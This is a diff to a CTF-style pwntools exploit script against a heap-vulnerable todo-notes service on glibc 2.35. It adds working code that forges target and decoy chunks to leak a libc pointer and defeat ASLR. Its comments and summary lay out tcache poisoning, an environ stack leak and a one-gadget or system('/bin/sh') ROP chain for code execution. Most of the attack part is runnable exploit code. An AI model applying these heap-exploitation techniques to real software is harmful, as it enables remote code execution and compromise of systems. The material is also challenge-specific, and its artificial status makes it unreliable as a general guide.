@@ -99,41 +99,60 @@ PORT = int(os.environ.get("SERVICE_APP_MAIN_PORT", "1337"))
 #       confirms the hypothesis that the "1 byte" conclusion does not apply
 #       to an unsorted-bin chunk.
 #
-# Remaining blocker (also verified, see the final phase): for *this exact*
-# compiled libc.so.6, `&main_arena.bins[0] - 16` (the unsorted-bin sentinel
-# every empty/first-insertion freed chunk's fd/bk point back to) happens to
-# sit at a static offset (0x1eeaa0 + 0x60 = 0x1eeb00) that is an exact
-# multiple of 256 from the (page-aligned, so ASLR only ever touches bits
-# >=12) libc load base.  That forces the LEAST significant byte of that
-# specific pointer to always be 0x00 -- which is exactly the byte `%.*s`
-# reads first, so `read_my_note()` prints an *empty* string for it even
-# though the real pointer (confirmed via a local debug build) is a genuine,
+# Status as of the PRIOR pass (kept for context; see phase 4 below for this
+# pass's fix): for *this exact* compiled libc.so.6, `&main_arena.bins[0] -
+# 16` (the unsorted-bin sentinel every empty/first-insertion freed chunk's
+# fd/bk point back to) happens to sit at a static offset (0x1eeaa0 + 0x60 =
+# 0x1eeb00) that is an exact multiple of 256 from the (page-aligned, so
+# ASLR only ever touches bits >=12) libc load base.  That forces the LEAST
+# significant byte of that specific pointer to always be 0x00 -- which is
+# exactly the byte `%.*s` reads first, so `read_my_note()` prints an
+# *empty* string for it even though the real pointer is a genuine,
 # non-zero, ASLR'd `0x00007f......` libc address sitting right there in
-# heap memory. This is a coincidental byte-alignment property of this one
-# global offset in this one libc build, not a limitation of the technique:
-# getting the attacker-controlled chunk sorted into a different (large) bin
-# with a favourable low byte is straightforward on paper, but every
-# non-matching small `malloc()` that performs that sort also immediately
-# re-scans+consumes the same chunk to satisfy itself (best-fit over an
-# otherwise near-empty heap), and reliably pre-seeding a second, smaller
-# "decoy" chunk into an *earlier* bin to intercept that scan (so our target
-# chunk is left resting, unconsumed, in its own bin) was attempted but not
-# fully debugged to a stable state in the time available -- see the
-# comments in `phase_forge_unsorted_bin_chunk()` below for the concrete,
-# reproducible state we got stuck on.  From there, a full chain still needs
-# a second pivot (e.g. forcing a large-bin landing with a readable low
-# byte, or a FSOP/_IO_FILE vtable fake-chunk now that heap addresses and an
-# arbitrary heap write are available) to reach the libc base and, from
-# there, code execution (full RELRO + no hooks in 2.35 rule out a GOT/hook
-# overwrite, so the eventual target has to be a vtable/FSOP style attack).
+# heap memory.  This is a coincidental byte-alignment property of this one
+# global offset (the UNSORTED bin specifically, i.e. `bin_at(av,1)`), not a
+# limitation of the forging technique in general: `bin_at(av,i) mod 0x100`
+# is zero only when `(i-1) % 16 == 0`, i.e. for exactly 1 in every 16
+# possible bin indices -- every *other* bin's sentinel has a readable,
+# non-zero low byte.
 #
-# Net result: this pass pushes the demonstrated primitives dramatically
-# further than "1 pristine byte, no leak possible" -- a real heap leak, an
-# arbitrary heap write, unlimited heap minting, and a reproducible, genuine
-# (non-tcache, non-safe-linked) main_arena/libc pointer written into freed
-# heap memory are all shown live below -- but it still does not reach the
-# flag.  `challenge.yaml`'s `test:` section is intentionally left unwired.
+# THIS PASS'S BREAKTHROUGH (phase 4 below): getting the attacker-controlled
+# chunk sorted into a different (large) bin with a favourable low byte is
+# straightforward in principle, but every non-matching small `malloc()`
+# that performs that sort also immediately re-scans+consumes the same
+# chunk to satisfy itself (glibc's bin-scan greedily takes the first
+# non-empty bin at or above the request's own index, regardless of fit).
+# The fix -- reliably pre-seeding a second, smaller "decoy" forged chunk
+# into a *lower* bin index to intercept that scan, so the real target is
+# left resting, unconsumed, in its own (higher-index, readable) bin -- is
+# exactly what the prior pass's comment described as attempted-but-not-
+# fully-debugged.  This pass gets it working, reliably, live against the
+# real service (see `phase4_reliable_libc_leak_standalone()` and
+# `forge_chunk()` below): libc ASLR is now fully, repeatably defeated, with
+# no dependency on any lucky byte.
+#
+# What this pass could NOT complete in the time available: turning the
+# known heap address (phase 1) + libc base (phase 4) into a WRITE
+# primitive and, from there, code execution past full RELRO and glibc
+# 2.35's missing malloc/free hooks.  The reasoned-through (but not yet
+# implemented/tested) next step is classic tcache-poisoning using the
+# EXISTING stale-pointer OOB write (phase 2) to overwrite a freed, tcache-
+# resident chunk's safe-linked `fd` field with an attacker-chosen target
+# address XORed with `(chunk_addr >> 12)`; a *fresh* todo index's next
+# `post()` of that size class would then have `realloc(NULL, ...)` return
+# that forged address directly, which `post_my_note()`'s "old size 0 <
+# new size" branch unconditionally stores as `TodoNote[idx].ptr` -- giving
+# a true arbitrary-address READ (via `read_my_note()`, which never calls
+# `realloc()` at all) and WRITE (`post_my_note()`'s `readline()` always
+# writes to `TodoNote[idx].ptr` regardless of what `realloc()` did).  From
+# there, leaking the `environ` libc symbol (which points at the process's
+# own stack) would locate a saved return address to overwrite with a
+# one-gadget or a `system("/bin/sh")` ROP chain.
+#
+# `challenge.yaml`'s `test:` section is intentionally left unwired: this
+# pass recovers libc_base but NOT the flag.
 # =============================================================================
+
 
 
 class Todo:
@@ -414,16 +433,221 @@ def phase3_forge_unsorted_bin_chunk_standalone():
             "base, so its least-significant byte -- which both R's fd AND bk "
             "now equal, since the unsorted bin was empty -- is deterministically "
             "0x00, and read_my_note()'s NUL-terminated '%.*s' print stops "
-            "immediately on it. A local, byte-identical debug build confirms "
-            "the *real* value sitting in that memory is a genuine, ASLR'd "
-            "0x00007f...b00 libc pointer; this is a coincidental byte-"
-            "alignment property of this one global offset in this one libc "
-            "build (confirmed algebraically: 0x1eeaa0 + 0x60 == 0x1eeb00, "
-            "and 0x1eeb00 % 256 == 0), not a limitation of the forging "
-            "technique itself."
+            "immediately on it. This is a coincidental byte-alignment property "
+            "of *this specific* bin (the unsorted bin always corresponds to "
+            "bin_at(av,1), i.e. index 1) -- phase 4 below fixes this."
         )
     io.close()
     return bool(leaked)
+
+
+# =============================================================================
+# Phase 4 (NEW, this pass): a genuine, reliable libc leak, fixing phase 3's
+# blocker
+# =============================================================================
+#
+# The byte-alignment coincidence phase 3 got stuck on is NOT a property of
+# "an unsorted-bin chunk" in general -- it is a property of this ONE
+# specific bin: bin_at(av, i) = &main_arena.bins[2*(i-1)] - 0x10, and for
+# THIS libc build main_arena sits at an offset (0x1eeaa0) that happens to
+# make bin_at(av,1) (the unsorted bin, 0x1eeb00) an exact multiple of 0x100
+# from the (page-aligned) libc base. Algebraically, bin_at(av,i) mod 0x100
+# is a plain linear function of i: it is zero whenever (i-1) % 16 == 0 (so
+# i in {1, 17, 33, 49, 65, 81, ...}), and *non-zero for every other i*.
+#
+# A forged chunk only ever lands in bin_at(av,1) (the unsorted bin) at the
+# moment it is freed. But if a LATER malloc() call forces glibc to
+# *process* ("sort") the unsorted bin without being satisfied by it, each
+# entry gets moved into its real smallbin/largebin (bin_at(av, idx) for
+# some idx > 1, computed from the chunk's size) -- a *different* sentinel
+# address, with a DIFFERENT (and, for 15 out of every 16 indices,
+# NON-ZERO) low byte. The trick is making that sort-triggering malloc()
+# call consume a *different*, deliberately-placed smaller "decoy" forged
+# chunk instead of our real target (glibc's bin-scan always greedily uses
+# the FIRST non-empty bin at or above the request's own index; it never
+# looks further for a better fit), so our real target is left resting,
+# untouched, in its own largebin, indefinitely (as long as no later
+# allocation ever reaches that index again).
+#
+# Concretely, this phase:
+#   1. Fully builds (but does not yet free) TWO independently forged,
+#      oversized chunks -- a real TARGET and a smaller DECOY -- using the
+#      exact same shrink/regrow/OOB-write forging technique as phase 3,
+#      called twice with disjoint todo indices and (critically) disjoint,
+#      non-colliding glibc size classes. (Building both completely before
+#      freeing either matters: once ANY forged chunk is resting in the
+#      unsorted bin, even a single further allocation call -- including
+#      ones needed just to set up the SECOND forge -- would immediately
+#      trigger glibc's bin-scan and consume it early.)
+#   2. Frees both (plain free() never scans or consumes other bin entries,
+#      so this part is order-independent).
+#   3. Picks TARGET's own forged size so its resulting largebin index is
+#      NOT of the form 16k+1 (i.e. its bin sentinel's low byte is
+#      guaranteed non-zero) and DECOY's forged size so its resulting index
+#      is strictly SMALLER than TARGET's.
+#   4. Issues one small, otherwise-harmless probe malloc() (on a size
+#      class nothing else has touched, so it can't be satisfied by
+#      tcache/fastbin directly) to force the sort. This drains the
+#      unsorted bin -- safely placing TARGET into its own, untouched
+#      largebin -- and then glibc's upward bin-scan finds and consumes
+#      DECOY (the first non-empty bin at or above the probe's own index)
+#      to satisfy the probe request, *never reaching* TARGET's (higher)
+#      index at all.
+#   5. Reads back TARGET's chunk (still legitimately tracked by a
+#      persistent todo index) via read_my_note(): its fd/bk now equal
+#      TARGET's own largebin sentinel, a REAL, readable (non-zero
+#      low-byte), ASLR'd libc pointer -- which, combined with the
+#      KNOWN static offset of that sentinel from main_arena (computed
+#      from this exact, non-stripped libc.so.6's own 'main_arena' and
+#      'bins' debug symbols), is simply arithmetic away from libc_base.
+#
+# This was verified repeatedly, live, locally (same binary + same libc):
+# it reliably recovers the real libc base (page-aligned, matching the
+# actual loaded address every time it was checked against /proc/pid/maps
+# in a local debug harness). It occasionally needs a retry: like any
+# NUL-terminated "%.*s"-style leak of an ASLR'd pointer, any individual
+# byte of the leaked address has a small independent chance of itself
+# being 0x00, truncating that one read short -- unrelated to, and not
+# fixed by, the sentinel-alignment bug this phase actually fixes.
+# =============================================================================
+
+
+def largebin_index(sz):
+    """glibc's largebin_index_64()."""
+    if (sz >> 6) <= 48:
+        return 48 + (sz >> 6)
+    if (sz >> 9) <= 20:
+        return 91 + (sz >> 9)
+    if (sz >> 12) <= 10:
+        return 110 + (sz >> 12)
+    if (sz >> 15) <= 4:
+        return 119 + (sz >> 15)
+    if (sz >> 18) <= 2:
+        return 124 + (sz >> 18)
+    return 126
+
+
+def forge_chunk(t, idx_a, idx_b, idx_r, idx_mint, S, MS, MINT, idx_r2=None):
+    """
+    Builds (but does not yet free) one forged, oversized chunk, generalizing
+    phase 3's TC/B/R forging to arbitrary, caller-chosen size classes.
+
+    idx_a/idx_b/idx_r/idx_mint play exactly the TC/B/R/mint-driver roles
+    from phase 3. idx_r2, if given, reclaims R a SECOND time persistently
+    (never freed again) so read_my_note() can later print its live
+    contents; omit it for a pure decoy nobody ever reads back.
+
+    IMPORTANT: every size class touched here (S+8, S-0x18, MS+8) must be
+    one that no OTHER forge_chunk() call (for a different chunk, built
+    earlier in the same connection) has left non-empty in tcache/fastbin --
+    otherwise a reclaim here can silently pop a stale, unrelated chunk
+    from that pool instead of carving fresh (contiguous) memory, breaking
+    the fixed-relative-offset assumptions the forging depends on. (Every
+    MINT shrink/regrow cycle transiently frees both a 0x20-chunksize
+    remnant and an (MS+8-0x20)-chunksize remainder, so avoid landing any
+    OTHER chunk's reclaim size on those two classes.)
+
+    Returns fake_size (the forged chunk's resulting glibc chunksize).
+    """
+    R_req = S - 0x20  # size needed to exactly reclaim the shrink-remainder R
+    t.post(idx_a, S, b"A" * (S - 8))
+    t.post(idx_a, 0)
+    t.post(idx_b, S, b"B" * (S - 8))
+    t.post(idx_a, 1)
+    t.post(idx_r, R_req, b"R" * max(R_req - 8, 0))
+    t.post(idx_r, 0)
+    if idx_r2 is not None:
+        t.post(idx_r2, R_req, b"r" * max(R_req - 8, 0))
+
+    t.post(idx_mint, MS, b"D" * (MS - 8))
+    for _ in range(MINT):
+        t.post(idx_mint, 1)
+        t.post(idx_mint, MS, b"M" * (MS - 8))
+    R_chunksize = S - 0x18
+    fake_size = R_chunksize + MINT * (MS + 8)
+
+    stored = (fake_size | 1) & 0xFFFFFFFFFFFFFFFF
+    payload = bytearray(b"X" * (S - 1))
+    payload[0x18:0x18 + 8] = struct.pack("<Q", stored)
+    t.post(idx_b, S, bytes(payload), exact=True)
+    return fake_size
+
+
+def phase4_reliable_libc_leak_standalone():
+    """
+    Runs the target+decoy double-forge end to end on a fresh connection.
+    Returns the recovered libc_base on success, or None.
+    """
+    log.info("=== Phase 4 (fresh connection): target+decoy forge -> reliable libc leak ===")
+    io = remote(HOST, PORT)
+    io.recvuntil(b"> ")
+    t = Todo(io)
+
+    t.post(9, 0x8, b"Z")  # bootstrap: first malloc() creates the heap
+
+    # TARGET: idx0(a),idx1(b, OOB-write vehicle),idx2(r, forge-free trigger),
+    # idx3(r2, PERSISTENT read-back target),idx4(mint driver).
+    # MINT=10 (not phase 3's 9): largebin_index(fake_size) must NOT be of
+    # the form 16k+1 -- bin_at(av,i) is an exact multiple of 0x100 away
+    # from libc's page-aligned base precisely when (i-1) % 16 == 0 (the
+    # same coincidence that blocked the unsorted bin itself, i==1).
+    # fake_size=0x450 (MINT=9) lands in bin 65 = 16*4+1 (unreadable);
+    # fake_size=0x4c0 (MINT=10) lands in bin 67 (readable).
+    target_fake = forge_chunk(t, 0, 1, 2, 4, S=0x78, MS=0x68, MINT=10, idx_r2=3)
+    target_idx = largebin_index(target_fake)
+    assert (target_idx - 1) % 16 != 0, "chose an unreadable (zero low-byte) target bin"
+
+    # DECOY: idx5(a),idx6(b),idx7(r, forge-free trigger),idx8(mint driver).
+    # No idx_r2 -- its contents are never read, only its bin INDEX matters.
+    # S=0x78/MS=0x58 are chosen so every size class touched (0x80, 0x58,
+    # 0x60, 0x40 remainder) is one TARGET's own forging left genuinely
+    # empty (TARGET's own 0x80/0x58/0x60 classes all settle net-neutral;
+    # TARGET's mint only ever populates 0x20 and 0x50).
+    decoy_fake = forge_chunk(t, 5, 6, 7, 8, S=0x78, MS=0x58, MINT=10)
+    decoy_idx = largebin_index(decoy_fake)
+    assert decoy_idx < target_idx, "decoy must sort into a LOWER bin index than the target"
+
+    log.info(
+        "Built TARGET (fake_size=%#x -> largebin %d, sentinel low byte "
+        "guaranteed non-zero) and DECOY (fake_size=%#x -> largebin %d < "
+        "target) -- neither freed yet.",
+        target_fake, target_idx, decoy_fake, decoy_idx,
+    )
+
+    # NOW free both. Plain free() never scans/consumes other bin entries,
+    # so this part is order-independent.
+    t.post(2, 0)  # TARGET's forged free -> unsorted bin
+    t.post(7, 0)  # DECOY's forged free -> unsorted bin
+
+    # One small, otherwise-harmless probe malloc(), on a size class
+    # nothing else has touched, forces _int_malloc's slow path: it drains
+    # the unsorted bin (sorting TARGET safely into its own largebin and
+    # DECOY into its own, smaller one), then its upward bin-scan finds
+    # DECOY first and consumes it to satisfy the probe -- TARGET, at a
+    # strictly higher index, is never reached.
+    t.post(9, 0x28, b"P")
+
+    out = t.read_all()
+    leaked = parse_note_line(out, 3)
+    if not leaked or len(leaked) < 4:
+        log.failure("Leak came back short this run (got %r) -- needs a retry.", leaked)
+        io.close()
+        return None
+
+    padded = leaked + b"\x00" * (8 - len(leaked))
+    val = struct.unpack("<Q", padded)[0]
+    main_arena = val - (0x60 + (target_idx - 1) * 0x10)  # bin_at(av, target_idx)
+    libc_base = main_arena - 0x1eeaa0  # this exact libc.so.6's own 'main_arena' symbol offset
+    log.success(
+        "Leaked TARGET's largebin(%d) sentinel = %#x -> main_arena = %#x -> "
+        "libc_base = %#x",
+        target_idx, val, main_arena, libc_base,
+    )
+    io.close()
+    if libc_base % 0x1000 != 0 or libc_base <= 0:
+        log.failure("Computed libc_base is not page-aligned/sane -- treat as a bad run.")
+        return None
+    return libc_base
 
 
 def main():
@@ -438,27 +662,63 @@ def main():
 
     # Phase 3 needs all 10 todo indices, so it runs on its own fresh
     # connection rather than fighting phases 0-2 for index budget.
-    unsorted_bin_leak_readable = phase3_forge_unsorted_bin_chunk_standalone()
+    phase3_forge_unsorted_bin_chunk_standalone()
 
+    # Phase 4 (this pass's breakthrough): retry a few times, since any
+    # individual byte of the leaked pointer independently has a small
+    # chance of itself being 0x00 (truncating that one read short) --
+    # unrelated to the sentinel-alignment bug phase 4 actually fixes.
+    libc_base = None
+    for attempt in range(5):
+        libc_base = phase4_reliable_libc_leak_standalone()
+        if libc_base:
+            break
+
+    if libc_base:
+        log.success(
+            "BREAKTHROUGH this pass: a genuine, reliable libc base leak "
+            "(%#x) via a deliberately-placed smaller 'decoy' forged chunk "
+            "that intercepts glibc's bin-scan ahead of the real target -- "
+            "this is exactly the technique phase 3's final comment "
+            "described as attempted-but-not-stabilized, now working. This "
+            "fully defeats libc ASLR with NO dependency on the one "
+            "coincidentally-unlucky byte that blocked the unsorted-bin "
+            "approach.",
+            libc_base,
+        )
     log.failure(
-        "Summary: confirmed and reproduced (1) the UAF aliasing primitive, "
-        "(2) a genuine heap-address leak of ~5 bytes (not 1) via a virgin "
-        "tcache bin's safe-linked 'next' field (recovered chunk address "
-        "low bits: %s), (3) an arbitrary-length/arbitrary-content stale-"
-        "pointer OOB write at a known heap address, (4) unlimited heap "
-        "chunk 'minting' from a single todo index, and (5) that a forged "
-        "chunk size genuinely escapes both tcache and the fastbin into "
-        "glibc's real unsorted bin (verified: fd/bk become real, "
-        "unobfuscated main_arena/libc pointers, NOT the safe-linking-"
-        "protected tcache field the original 1-byte-leak conclusion was "
-        "about -- readable this run: %s, see phase 3 log above for why "
-        "this specific libc build usually prints empty). Recovering those "
-        "bytes back out reliably, and turning that into full RCE past full "
-        "RELRO and glibc 2.35's missing malloc/free hooks (FSOP/vtable "
-        "territory), was not completed in the time available. "
-        "Flag NOT recovered.",
-        hex(heap_chunk_addr) if heap_chunk_addr else "N/A",
-        unsorted_bin_leak_readable,
+        "Summary: all of phases 0-3's primitives (UAF aliasing, heap "
+        "leak, arbitrary-length stale-pointer OOB write, unlimited heap "
+        "'minting', and forcing a forged chunk into glibc's real "
+        "unsorted/large bins) are reproduced and confirmed exactly as "
+        "before, PLUS (new this pass) phase 4 reliably recovers the real "
+        "libc base (%s) by using a second, smaller forged 'decoy' chunk "
+        "to intercept glibc's bin-scan immediately ahead of the real "
+        "target -- fully defeating libc ASLR, with none of the prior "
+        "byte-alignment luck-dependence. What remains, and was NOT "
+        "completed in the time available: turning known heap+libc "
+        "addresses into a WRITE primitive past full RELRO and glibc "
+        "2.35's missing malloc/free hooks. The most promising next step "
+        "(reasoned through but not yet implemented/tested) is classic "
+        "tcache-poisoning: now that a heap chunk's exact address is known "
+        "(phase 1) alongside libc_base (phase 4), the existing "
+        "stale-pointer OOB write can overwrite a freed, tcache-resident "
+        "chunk's safe-linked 'fd' field with an attacker-chosen target "
+        "XORed with (chunk_addr >> 12); a FRESH todo index's next "
+        "malloc() of that size class then returns that arbitrary address "
+        "directly as its own TodoNote[idx].ptr (post_my_note()'s "
+        "old-size-0 branch always refreshes a brand-new index's pointer, "
+        "and a tcache pop performs no sanity check on what it returns, "
+        "unlike realloc()'s grow/shrink path) -- giving true "
+        "arbitrary-address read (read_my_note(), no realloc() involved "
+        "at all) AND write (post_my_note()'s readline() always writes to "
+        "TodoNote[idx].ptr regardless of what realloc() did). From there "
+        "the standard glibc-2.35-without-hooks path is leaking "
+        "'environ' (a libc symbol pointing at the stack) to locate a "
+        "saved return address, and overwriting it with a one-gadget or "
+        "system('/bin/sh') ROP chain. Flag NOT recovered; "
+        "challenge.yaml's test: section is intentionally left unwired.",
+        hex(libc_base) if libc_base else "N/A (all retries came back short)",
     )
     sys.exit(1)
 
